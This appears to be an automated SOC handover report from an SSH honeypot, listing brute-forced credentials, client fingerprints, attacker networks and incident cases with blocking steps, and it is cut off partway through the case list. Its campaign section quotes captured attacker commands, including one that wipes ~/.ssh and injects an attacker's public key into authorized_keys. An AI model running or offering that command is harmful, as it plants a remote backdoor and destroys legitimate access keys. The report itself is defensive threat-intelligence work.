# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-19 |
| **Generated At** | 2026-08-19T20:33:47Z |
| **Shift Time** | 20:33 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **464** |
| Confirmed Threats | **446** |
| False Positives Filtered | **18** (3.9%) |
| Unique Attacker IPs | **70** |
| Countries of Origin | **30** |
| High Severity Cases | **67** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **397** |
| Malware Samples Analyzed | **2** HIGH · **22** MED · 20 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **85** |
| Unique Credential Pairs | **51** |
| Unique Usernames | **20** |
| Unique Passwords | **44** |
| Successful Auth Pairs | **76** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `operator` | 15 |
| `root` | 13 |
| `admin` | 7 |
| `guest` | 6 |
| `support` | 6 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123456` | 6 |
| `admin2002` | 5 |
| `ubnt2024` | 5 |
| `operator2007` | 5 |
| `support` | 4 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `admin` | `admin2002` | 5 |
| `ubnt` | `ubnt2024` | 5 |
| `operator` | `operator2007` | 5 |
| `support` | `support` | 4 |
| `guest` | `guest2012` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `admin` | `admin2002` | `10.0.0.73` | 2026-08-19T16:55:32 |
| `guest` | `guest2017` | `194.31.8.12` | 2026-08-19T16:56:45 |
| `guest` | `guest2017` | `187.218.57.50` | 2026-08-19T16:56:53 |
| `guest1` | `123456` | `85.158.145.129` | 2026-08-19T16:57:34 |
| `guest1` | `123654` | `85.158.145.129` | 2026-08-19T17:03:30 |
| `root` | `112233` | `110.173.190.221` | 2026-08-19T17:03:31 |
| `support` | `support2013` | `59.48.40.6` | 2026-08-19T17:07:09 |
| `support` | `support2013` | `43.248.213.232` | 2026-08-19T17:07:19 |
| `guest1` | `guest1` | `85.158.145.129` | 2026-08-19T17:09:28 |
| `support` | `support` | `10.0.0.73` | 2026-08-19T17:11:21 |
| `ubnt` | `ubnt2024` | `218.202.143.68` | 2026-08-19T17:12:28 |
| `ubnt` | `ubnt2024` | `186.179.80.12` | 2026-08-19T17:12:37 |
| `admin` | `admin2002` | `121.179.93.147` | 2026-08-19T17:13:36 |
| `admin` | `admin2002` | `203.252.10.4` | 2026-08-19T17:13:46 |
| `admin` | `admin2002` | `31.173.0.46` | 2026-08-19T17:13:47 |
| `admin` | `admin2002` | `59.120.8.61` | 2026-08-19T17:13:56 |
| `openproject` | `123456` | `85.158.145.129` | 2026-08-19T17:15:25 |
| `root` | `112233332211` | `110.173.190.221` | 2026-08-19T17:16:04 |
| `openproject` | `openproject` | `85.158.145.129` | 2026-08-19T17:21:22 |
| `ubnt` | `ubnt2024` | `10.0.0.73` | 2026-08-19T17:23:41 |
| `openuser` | `openuser` | `85.158.145.129` | 2026-08-19T17:27:19 |
| `root` | `1234567` | `110.173.190.221` | 2026-08-19T17:28:35 |
| `user` | `user2009` | `149.54.15.162` | 2026-08-19T17:30:30 |
| `user` | `user2009` | `178.178.194.135` | 2026-08-19T17:30:43 |
| `openvpn` | `123456` | `85.158.145.129` | 2026-08-19T17:33:15 |
| `openvpn_as` | `123456` | `85.158.145.129` | 2026-08-19T17:39:13 |
| `ubnt` | `ubnt2024` | `123.123.196.140` | 2026-08-19T17:40:43 |
| `root` | `12345678` | `110.173.190.221` | 2026-08-19T17:41:01 |
| `openvpn_as` | `openvpn_as` | `85.158.145.129` | 2026-08-19T17:45:10 |
| `guest` | `guest2012` | `10.0.0.73` | 2026-08-19T17:46:32 |
| `operator` | `123123` | `122.187.230.183` | 2026-08-19T17:47:23 |
| `operator` | `123123` | `218.13.214.18` | 2026-08-19T17:47:36 |
| `guest` | `guest2012` | `107.135.117.245` | 2026-08-19T17:48:06 |
| `support` | `support` | `176.53.159.196` | 2026-08-19T17:50:47 |
| `operator` | `0000` | `85.158.145.129` | 2026-08-19T17:51:06 |
| `root` | `123456789` | `110.173.190.221` | 2026-08-19T17:53:31 |
| `root` | `Admin2022` | `45.117.177.47` | 2026-08-19T17:53:53 |
| `345gs5662d34` | `345gs5662d34` | `45.117.177.47` | 2026-08-19T17:53:57 |
| `root` | `3245gs5662d34` | `45.117.177.47` | 2026-08-19T17:53:59 |
| `operator` | `123456` | `85.158.145.129` | 2026-08-19T17:57:03 |
| `default` | `default2024` | `10.0.0.73` | 2026-08-19T17:57:10 |
| `mcserver` | `123456` | `194.164.59.59` | 2026-08-19T17:59:41 |
| `345gs5662d34` | `345gs5662d34` | `194.164.59.59` | 2026-08-19T17:59:44 |
| `mcserver` | `3245gs5662d34` | `194.164.59.59` | 2026-08-19T17:59:45 |
| `unknown` | `unknown2017` | `10.0.0.73` | 2026-08-19T18:02:18 |
| `operator` | `operator` | `85.158.145.129` | 2026-08-19T18:03:00 |
| `guest` | `guest2012` | `58.245.210.70` | 2026-08-19T18:04:00 |
| `root` | `1234567890` | `110.173.190.221` | 2026-08-19T18:06:03 |
| `operator` | `operator1` | `85.158.145.129` | 2026-08-19T18:08:57 |
| `oper` | `oper` | `85.158.145.129` | 2026-08-19T18:14:54 |
| `root` | `0987654321` | `110.173.190.221` | 2026-08-19T18:18:42 |
| `operator` | `operator1234567` | `213.230.64.246` | 2026-08-19T18:19:10 |
| `blank` | `blank123` | `10.0.0.73` | 2026-08-19T18:20:02 |
| `unknown` | `unknown2017` | `121.189.198.60` | 2026-08-19T18:20:19 |
| `orace` | `oracle123` | `85.158.145.129` | 2026-08-19T18:20:51 |
| `oracle` | `0000` | `85.158.145.129` | 2026-08-19T18:26:47 |
| `root` | `﻿------fuck------` | `120.26.202.34` | 2026-08-19T18:29:38 |
| `operator` | `operator1234567` | `10.0.0.73` | 2026-08-19T18:30:35 |
| `root` | `987654321` | `110.173.190.221` | 2026-08-19T18:31:17 |
| `oracle` | `111111` | `85.158.145.129` | 2026-08-19T18:32:44 |
| `operator` | `operator2007` | `10.0.0.73` | 2026-08-19T18:35:41 |
| `blank` | `blank123` | `49.206.201.253` | 2026-08-19T18:37:28 |
| `blank` | `blank123` | `92.84.21.186` | 2026-08-19T18:37:35 |
| `oracle` | `12` | `85.158.145.129` | 2026-08-19T18:38:41 |
| `root` | `87654321` | `110.173.190.221` | 2026-08-19T18:43:52 |
| `root` | `linux` | `180.76.235.175` | 2026-08-19T18:44:32 |
| `oracle` | `123` | `85.158.145.129` | 2026-08-19T18:44:39 |
| `operator` | `operator1234567` | `222.175.187.214` | 2026-08-19T18:47:28 |
| `oracle` | `123!@#` | `85.158.145.129` | 2026-08-19T18:50:36 |
| `admin` | `admin2016` | `213.234.9.218` | 2026-08-19T18:52:42 |
| `admin` | `admin2016` | `61.2.228.177` | 2026-08-19T18:52:56 |
| `unknown` | `passw0rd` | `10.0.0.73` | 2026-08-19T18:53:15 |
| `operator` | `operator2007` | `39.183.162.243` | 2026-08-19T18:53:51 |
| `operator` | `operator2007` | `178.178.222.50` | 2026-08-19T18:53:58 |
| `operator` | `operator2007` | `62.182.132.94` | 2026-08-19T18:53:59 |
| `operator` | `operator2007` | `177.174.0.3` | 2026-08-19T18:54:07 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **464** |
| Sessions with Fingerprint | **9** |
| Unique HASSH Fingerprints | **9** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 36 |
| OpenSSH | 28 |
| libssh | 12 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 28 | 28 |
| `98f63c4d9c87...` | Generic scanner | 21 | 2 |
| `98ddc5604ef6...` | Modern SSH client | 10 | 2 |
| `f555226df196...` | Mirai/variant | 3 | 1 |
| `af8223ac9914...` | libssh-based | 3 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 28 | 28 | Mirai/variant |
| `98f63c4d9c87...` | Go SSH scanner | 21 | 2 | Generic scanner |
| `98ddc5604ef6...` | Go SSH scanner | 10 | 2 | Modern SSH client |
| `95420f9d932d...` | libssh | 6 | 2 | — |
| `f555226df196...` | libssh | 3 | 1 | Mirai/variant |
| `af8223ac9914...` | libssh | 3 | 1 | libssh-based |
| `e54ef3ec27fe...` | Go SSH scanner | 2 | 2 | Generic scanner |
| `eff4c24daffc...` | Go SSH scanner | 2 | 1 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **4** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 2 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `194.164.59.59`, `45.117.177.47`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **70** |
| Unique ASNs | **60** |
| High-Risk ASNs | **49** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 4 | HIGH |
| `AS25159` | PJSC MegaFon | 4 | HIGH |
| `AS4766` | Korea Telecom | 2 | HIGH |
| `AS8193` | "Uzbektelekom" Joint Stock Company | 2 | HIGH |
| `AS396982` | Google LLC | 2 | HIGH |
| `AS9808` | China Mobile Communications Group Co., Ltd. | 2 | HIGH |
| `AS63949` | Akamai Connected Cloud | 1 | HIGH |
| `AS58474` | PT. MATRIXNET GLOBAL INDONESIA | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (67)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-3de7ba24a140

| Field | Detail |
|---|---|
| **Source IP** | `194.31.8[.]12` |
| **First Seen** | 2026-08-19 16:56 |
| **Last Seen** | 2026-08-19 16:56 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 16:56:43` | `cowrie.session.connect` |
| `2026-08-19 16:56:44` | `cowrie.client.version` |
| `2026-08-19 16:56:44` | `cowrie.client.kex` |
| `2026-08-19 16:56:45` | `cowrie.login.success` |
| `2026-08-19 16:56:46` | `cowrie.direct-tcpip.request` |
| `2026-08-19 16:56:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `194.31.8[.]12` to AbuseIPDB if not already reported
- [ ] Block `194.31.8[.]12` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1dd6775913da

| Field | Detail |
|---|---|
| **Source IP** | `187.218.57[.]50` |
| **First Seen** | 2026-08-19 16:56 |
| **Last Seen** | 2026-08-19 16:56 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 16:56:51` | `cowrie.session.connect` |
| `2026-08-19 16:56:51` | `cowrie.client.version` |
| `2026-08-19 16:56:51` | `cowrie.client.kex` |
| `2026-08-19 16:56:53` | `cowrie.login.success` |
| `2026-08-19 16:56:53` | `cowrie.direct-tcpip.request` |
| `2026-08-19 16:56:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.218.57[.]50` to AbuseIPDB if not already reported
- [ ] Block `187.218.57[.]50` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-849075213e67

| Field | Detail |
|---|---|
| **Source IP** | `85.158.145[.]129` |
| **First Seen** | 2026-08-19 16:57 |
| **Last Seen** | 2026-08-19 16:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 16:57:33` | `cowrie.session.connect` |
| `2026-08-19 16:57:33` | `cowrie.client.version` |
| `2026-08-19 16:57:33` | `cowrie.client.kex` |
| `2026-08-19 16:57:34` | `cowrie.login.success` |
| `2026-08-19 16:57:34` | `cowrie.session.params` |
| `2026-08-19 16:57:34` | `cowrie.command.input` |
| `2026-08-19 16:57:35` | `cowrie.log.closed` |
| `2026-08-19 16:57:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.158.145[.]129` to AbuseIPDB if not already reported
- [ ] Block `85.158.145[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b5fb3cc3f54

| Field | Detail |
|---|---|
| **Source IP** | `110.173.190[.]221` |
| **First Seen** | 2026-08-19 17:03 |
| **Last Seen** | 2026-08-19 17:03 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 17:03:22` | `cowrie.session.connect` |
| `2026-08-19 17:03:24` | `cowrie.client.version` |
| `2026-08-19 17:03:24` | `cowrie.client.kex` |
| `2026-08-19 17:03:31` | `cowrie.login.success` |
| `2026-08-19 17:03:34` | `cowrie.session.params` |
| `2026-08-19 17:03:34` | `cowrie.command.input` |
| `2026-08-19 17:03:36` | `cowrie.log.closed` |
| `2026-08-19 17:03:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.173.190[.]221` to AbuseIPDB if not already reported
- [ ] Block `110.173.190[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d075a82f609d

| Field | Detail |
|---|---|
| **Source IP** | `85.158.145[.]129` |
| **First Seen** | 2026-08-19 17:03 |
| **Last Seen** | 2026-08-19 17:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 17:03:30` | `cowrie.session.connect` |
| `2026-08-19 17:03:30` | `cowrie.client.version` |
| `2026-08-19 17:03:30` | `cowrie.client.kex` |
| `2026-08-19 17:03:30` | `cowrie.login.success` |
| `2026-08-19 17:03:31` | `cowrie.session.params` |
| `2026-08-19 17:03:31` | `cowrie.command.input` |
| `2026-08-19 17:03:31` | `cowrie.log.closed` |
| `2026-08-19 17:03:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.158.145[.]129` to AbuseIPDB if not already reported
- [ ] Block `85.158.145[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34d950addba3

| Field | Detail |
|---|---|
| **Source IP** | `59.48.40[.]6` |
| **First Seen** | 2026-08-19 17:07 |
| **Last Seen** | 2026-08-19 17:07 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 17:07:06` | `cowrie.session.connect` |
| `2026-08-19 17:07:07` | `cowrie.client.version` |
| `2026-08-19 17:07:07` | `cowrie.client.kex` |
| `2026-08-19 17:07:09` | `cowrie.login.success` |
| `2026-08-19 17:07:10` | `cowrie.direct-tcpip.request` |
| `2026-08-19 17:07:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.48.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `59.48.40[.]6` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cdfd71ded6bb

| Field | Detail |
|---|---|
| **Source IP** | `43.248.213[.]232` |
| **First Seen** | 2026-08-19 17:07 |
| **Last Seen** | 2026-08-19 17:07 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 17:07:16` | `cowrie.session.connect` |
| `2026-08-19 17:07:17` | `cowrie.client.version` |
| `2026-08-19 17:07:17` | `cowrie.client.kex` |
| `2026-08-19 17:07:19` | `cowrie.login.success` |
| `2026-08-19 17:07:20` | `cowrie.direct-tcpip.request` |
| `2026-08-19 17:07:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.248.213[.]232` to AbuseIPDB if not already reported
- [ ] Block `43.248.213[.]232` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd5779c12376

| Field | Detail |
|---|---|
| **Source IP** | `85.158.145[.]129` |
| **First Seen** | 2026-08-19 17:09 |
| **Last Seen** | 2026-08-19 17:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 17:09:27` | `cowrie.session.connect` |
| `2026-08-19 17:09:27` | `cowrie.client.version` |
| `2026-08-19 17:09:27` | `cowrie.client.kex` |
| `2026-08-19 17:09:28` | `cowrie.login.success` |
| `2026-08-19 17:09:29` | `cowrie.session.params` |
| `2026-08-19 17:09:29` | `cowrie.command.input` |
| `2026-08-19 17:09:29` | `cowrie.log.closed` |
| `2026-08-19 17:09:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.158.145[.]129` to AbuseIPDB if not already reported
- [ ] Block `85.158.145[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3bd0e4cbdb7e

| Field | Detail |
|---|---|
| **Source IP** | `218.202.143[.]68` |
| **First Seen** | 2026-08-19 17:12 |
| **Last Seen** | 2026-08-19 17:12 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 17:12:25` | `cowrie.session.connect` |
| `2026-08-19 17:12:26` | `cowrie.client.version` |
| `2026-08-19 17:12:26` | `cowrie.client.kex` |
| `2026-08-19 17:12:28` | `cowrie.login.success` |
| `2026-08-19 17:12:29` | `cowrie.direct-tcpip.request` |
| `2026-08-19 17:12:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.202.143[.]68` to AbuseIPDB if not already reported
- [ ] Block `218.202.143[.]68` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-778f710010f3

| Field | Detail |
|---|---|
| **Source IP** | `186.179.80[.]12` |
| **First Seen** | 2026-08-19 17:12 |
| **Last Seen** | 2026-08-19 17:12 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 17:12:34` | `cowrie.session.connect` |
| `2026-08-19 17:12:35` | `cowrie.client.version` |
| `2026-08-19 17:12:35` | `cowrie.client.kex` |
| `2026-08-19 17:12:37` | `cowrie.login.success` |
| `2026-08-19 17:12:38` | `cowrie.direct-tcpip.request` |
| `2026-08-19 17:12:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.179.80[.]12` to AbuseIPDB if not already reported
- [ ] Block `186.179.80[.]12` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-033568b22077

| Field | Detail |
|---|---|
| **Source IP** | `121.179.93[.]147` |
| **First Seen** | 2026-08-19 17:13 |
| **Last Seen** | 2026-08-19 17:13 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 17:13:32` | `cowrie.session.connect` |
| `2026-08-19 17:13:33` | `cowrie.client.version` |
| `2026-08-19 17:13:33` | `cowrie.client.kex` |
| `2026-08-19 17:13:36` | `cowrie.login.success` |
| `2026-08-19 17:13:37` | `cowrie.direct-tcpip.request` |
| `2026-08-19 17:13:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.179.93[.]147` to AbuseIPDB if not already reported
- [ ] Block `121.179.93[.]147` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ef283f75874

| Field | Detail |
|---|---|
| **Source IP** | `203.252.10[.]4` |
| **First Seen** | 2026-08-19 17:13 |
| **Last Seen** | 2026-08-19 17:13 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 17:13:43` | `cowrie.session.connect` |
| `2026-08-19 17:13:43` | `cowrie.client.version` |
| `2026-08-19 17:13:43` | `cowrie.client.kex` |
| `2026-08-19 17:13:46` | `cowrie.login.success` |
| `2026-08-19 17:13:47` | `cowrie.direct-tcpip.request` |
| `2026-08-19 17:13:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.252.10[.]4` to AbuseIPDB if not already reported
- [ ] Block `203.252.10[.]4` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4193906e9f55

| Field | Detail |
|---|---|
| **Source IP** | `31.173.0[.]46` |
| **First Seen** | 2026-08-19 17:13 |
| **Last Seen** | 2026-08-19 17:13 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 17:13:45` | `cowrie.session.connect` |
| `2026-08-19 17:13:45` | `cowrie.client.version` |
| `2026-08-19 17:13:45` | `cowrie.client.kex` |
| `2026-08-19 17:13:47` | `cowrie.login.success` |
| `2026-08-19 17:13:48` | `cowrie.direct-tcpip.request` |
| `2026-08-19 17:13:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.173.0[.]46` to AbuseIPDB if not already reported
- [ ] Block `31.173.0[.]46` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d99653ab0704

| Field | Detail |
|---|---|
| **Source IP** | `59.120.8[.]61` |
| **First Seen** | 2026-08-19 17:13 |
| **Last Seen** | 2026-08-19 17:14 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 17:13:53` | `cowrie.session.connect` |
| `2026-08-19 17:13:54` | `cowrie.client.version` |
| `2026-08-19 17:13:54` | `cowrie.client.kex` |
| `2026-08-19 17:13:56` | `cowrie.login.success` |
| `2026-08-19 17:13:56` | `cowrie.direct-tcpip.request` |
| `2026-08-19 17:14:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.120.8[.]61` to AbuseIPDB if not already reported
- [ ] Block `59.120.8[.]61` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6fdc8d11871b

| Field | Detail |
|---|---|
| **Source IP** | `85.158.145[.]129` |
| **First Seen** | 2026-08-19 17:15 |
| **Last Seen** | 2026-08-19 17:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 17:15:25` | `cowrie.session.connect` |
| `2026-08-19 17:15:25` | `cowrie.client.version` |
| `2026-08-19 17:15:25` | `cowrie.client.kex` |
| `2026-08-19 17:15:25` | `cowrie.login.success` |
| `2026-08-19 17:15:26` | `cowrie.session.params` |
| `2026-08-19 17:15:26` | `cowrie.command.input` |
| `2026-08-19 17:15:26` | `cowrie.log.closed` |
| `2026-08-19 17:15:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.158.145[.]129` to AbuseIPDB if not already reported
- [ ] Block `85.158.145[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e9c1ff0ad71c

| Field | Detail |
|---|---|
| **Source IP** | `110.173.190[.]221` |
| **First Seen** | 2026-08-19 17:15 |
| **Last Seen** | 2026-08-19 17:16 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 17:15:56` | `cowrie.session.connect` |
| `2026-08-19 17:15:57` | `cowrie.client.version` |
| `2026-08-19 17:15:57` | `cowrie.client.kex` |
| `2026-08-19 17:16:04` | `cowrie.login.success` |
| `2026-08-19 17:16:08` | `cowrie.session.params` |
| `2026-08-19 17:16:08` | `cowrie.command.input` |
| `2026-08-19 17:16:10` | `cowrie.log.closed` |
| `2026-08-19 17:16:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.173.190[.]221` to AbuseIPDB if not already reported
- [ ] Block `110.173.190[.]221` at perimeter firewall / security group
